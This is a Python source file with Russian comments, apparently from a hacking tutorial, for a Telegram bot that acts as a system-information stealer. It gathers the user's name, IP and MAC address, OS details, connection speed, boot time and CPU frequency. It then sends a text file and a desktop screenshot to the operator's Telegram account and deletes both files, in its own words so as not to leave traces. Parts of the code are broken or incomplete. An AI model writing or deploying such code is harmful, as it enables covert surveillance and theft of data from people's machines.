import getpass  # нужен для опре­деле­ния информа­ции о поль­зовате­ле;
import os  # исполь­зуем для вза­имо­дей­ствия с фун­кци­ями ОС, вро­де вызова внеш­них исполня­емых фай­лов;
import platform  # пре­дос­тавит информа­цию об ОС;
import socket  # для работы с сокета­ми и получе­ния IP-адре­сов;
from datetime import \
    datetime  # поз­волит опре­делить вре­мя работы прог­раммы;
from uuid import getnode as get_mac  # получа­ет MAC-адрес машины;

import psutil  # работа­ет с некото­рыми низ­коуров­невыми сис­темны­ми фун­кци­ями;
import pyautogui  # "быс­тро и без боли" работа­ет с GUI;
from aiogram import Dispatcher
from data.config import ADMINS
from loader import dp
from PIL import Image  # для сня­тия скрин­шота;
from speedtest import \
    Speedtest  # замеря­ет харак­терис­тики интернет‑соеди­нения;

name = getpass.getuser()    # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn())   # IP-адрес системы
mac = get_mac()   # MAC адрес
ost = platform.uname()    # Название операционной системы

# Скорость интернет-соединения
inet = Speedtest()
download = float(str(inet.download())[0:2] + "." # Входящая скорость
                + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."   # Исходящая скорость
                + str(round(inet.download(), 2))[1]) * 0.125

# Часовой пояс и время
zone = psutil.boot_time()   # Узнает время, заданное на компьютере
time = datetime.fromtimestamp(zone)   # Переводит данные в читаемый вид

# Частота процессора
cpu = psutil.cpu_freq()

for adminF in ADMINS:
    admin = adminF

# Скриншот рабочего стола
text = "Screenshot" # Требуется при создании скриншота (текст к фото)
@dp.message_handler(commands="pars_os") # Выполняет действия при команде start
async def pars_os(dp: Dispatcher):
    upfile = open("Путь до файла\info.txt", "rb") # Читает файлы
    uphoto = open("Путь до файла\screenshot.jpg", "rb")
    
    await dp.bot.send_photo(admin, uphoto, text) # Отправляет данные
    await dp.bot.send_document(admin, upfile)
    
    upfile.close() # Закрывает файлы (обязательно)
    uphoto.close()
    
    os.remove("info.txt") # Удаляет файлы, чтобы не оставлять следы
    os.remove("screenshot.jpg")
    dp.stop_polling() # Закрывает соединение после отправки

